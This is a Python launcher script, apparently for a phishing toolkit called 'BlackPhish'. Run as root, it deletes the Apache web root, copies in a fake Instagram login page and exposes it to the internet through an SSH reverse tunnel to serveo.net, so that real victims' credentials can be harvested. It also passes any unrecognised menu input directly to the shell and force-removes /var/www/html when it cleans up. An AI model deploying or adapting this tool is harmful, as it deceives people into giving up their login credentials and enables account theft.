#!/usr/bin/python3

# version 2.1: - Added clear option - If prompt say yes(line:103) - clean on exit - made clean a function

# Please update version number each time we update

try:
    import os

except ImportError():
    print("\033[31;1m" + "[!] Error importing")
    exit(1)

 # Variables #

cwd = os.getcwd()

# COLORS #

red = "\033[91;1m"

reset = "\033[0m"

green = "\033[32;1m"

cyan = "\033[36;1m"

yellow = "\033[33;1m"

magenta = "\033[35;1m"

blue = "\033[34;1m"

white = "\033[37;1m"



if os.geteuid() != 0:
    exit(red + "[!] Please run as root" + reset)



def serveo_forward(): # Port forward to serveo#
    os.system('ssh -o ServerAliveInterval=9999 -R inc0gnit0:80:localhost:80 serveo.net')
    #subprocess.Popen(["rm","-r","some.file"])
    
def banner():
    print('''
 \033[91;1m
                https://github.com/iinc0gnit0/BlackPhish \033[94;1m

                             ░███░                                   ░█░   
                           ░█████                                  ░███    
                          ▒█████▓                                ░███░     
                         ████████                               ████▓      
                       ░█████████░                            ░█████       
                     ░█████████████                          ░██████       
          ░░▒███████████████████████████░░░                 ▓██████░       
 ░░░░███████████████████████████████████████████▓░▒█░     ░███████░        
█████████████████████████████████████████████████████████████████          
 ░████████████████████████████████████████████████████████████████░        
     ░░▓██████████████████████████████████████▓░░░██▓      ░░██████░       
             ░░░░▒█████████████████████░████░                  ░█████░     
                  ██████                 ░                                 
                  ░█████                                                   
                   ░████                                                   
                    ░███                                                   
                      ░█      
                                                      \033[91m
        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
        
                
                    Banner made by: \033[91m[tuf_unkn0wn]\033[94;1m
                    
                    Script created by: \033[91m[inc0gnit0] [retro0001]\033[94;1m
                    
                    Websites created by: \033[91m[TableFlipGod] \033[0m
                    
''')
    
def clean():
    print(green + '[+] Stopping Apache2 Service')
    os.system('service apache2 stop')
    print(green + '[+] Stopping Traffic forwarding to serveo')
    os.system('pkill -f inc0gnit0:80:localhost:80')
    print(green + '[+] Cleaning /var/www/html/')
    os.system('rm -r /var/www/html/ && mkdir /var/www/html')
    print(green + '[+] Done')
    

def main():  # Main script #
    
    os.system('clear')
    
    banner()

    choice = input(red + "    [BlackPhish] -> ") # Get user input #

    if choice == "1":
        print(green + '[+] Copying Files')
        print(green + '[+] Cleaning /var/www/html/')
        os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
        os.system('cp '+'-r '+ cwd  + '/Instagram/Instagram-Login/index.html' " /var/www/html/")
        print(green + '[+] Starting Apache2 Service')
        print(green + '[+] If prompt, please say yes')
        os.system('service apache2 start')
        serveo_forward()
        print(green + '[+] Done')
        main()

    elif choice == "help":
        print('')

    elif choice == "clear":
        os.system('clear')
        main()
    elif choice == "clean":
        clean()
        main()

    
    elif choice != "":
        os.system(""+choice)
        main()
    

    else:
        print(red + "[!] Invalid option" + reset)
        main()


try: # This will start the script
    if __name__ == '__main__':
        main()

except KeyboardInterrupt: # Will detect if they exit #
    print("\n")
    clean()
    print(red + "[!] Exiting" + reset)
    exit(0)
